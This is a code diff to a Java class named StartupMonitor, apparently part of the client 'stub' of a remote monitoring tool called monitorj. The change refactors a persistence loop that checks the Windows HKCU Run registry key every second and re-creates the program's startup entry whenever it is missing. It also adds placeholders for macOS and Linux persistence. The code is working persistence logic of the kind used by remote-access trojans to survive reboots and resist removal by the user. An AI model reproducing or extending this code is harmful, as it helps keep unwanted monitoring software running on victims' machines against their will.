@@ -1,6 +1,7 @@
 package me.jershdervis.monitorj.stub.secure;
 
 import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
+import me.jershdervis.monitorj.stub.util.OSCheck;
 import me.jershdervis.monitorj.stub.util.WinRegistry;
 
 import java.lang.reflect.InvocationTargetException;
@@ -20,9 +21,19 @@ public class StartupMonitor extends ClientSystemUtil implements Runnable {
 
     @Override
     public void run() {
-        while (true) {
-            if(!this.startupKeyExists(keyName)) {
-                this.createStartupKey(keyName);
+        OSCheck.OSType osType = OSCheck.getOperatingSystemType();
+        while(true) {
+            switch (osType) {
+                case Windows:
+                    if(!this.windowsStartupKeyExists(keyName))
+                        this.createWindowsStartupKey(keyName);
+                    break;
+                case MacOS:
+                    //TODO: Add Mac OS Startup persistence
+                    break;
+                case Linux:
+                    //TODO: Add Linux Startup persistence
+                    break;
             }
             try {
                 Thread.sleep(1000L);
@@ -32,7 +43,12 @@ public class StartupMonitor extends ClientSystemUtil implements Runnable {
         }
     }
 
-    private boolean startupKeyExists(String name) {
+    /**
+     * Checks if the Registry Key exists in the Windows Registry
+     * @param name
+     * @return
+     */
+    private boolean windowsStartupKeyExists(String name) {
         try {
             String userKey = WinRegistry.readString(WinRegistry.HKEY_CURRENT_USER,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -47,7 +63,11 @@ public class StartupMonitor extends ClientSystemUtil implements Runnable {
         return false;
     }
 
-    private void createStartupKey(String name) {
+    /**
+     * Creates the Startup key in Windows Registry
+     * @param name
+     */
+    private void createWindowsStartupKey(String name) {
         try {
             WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     name,
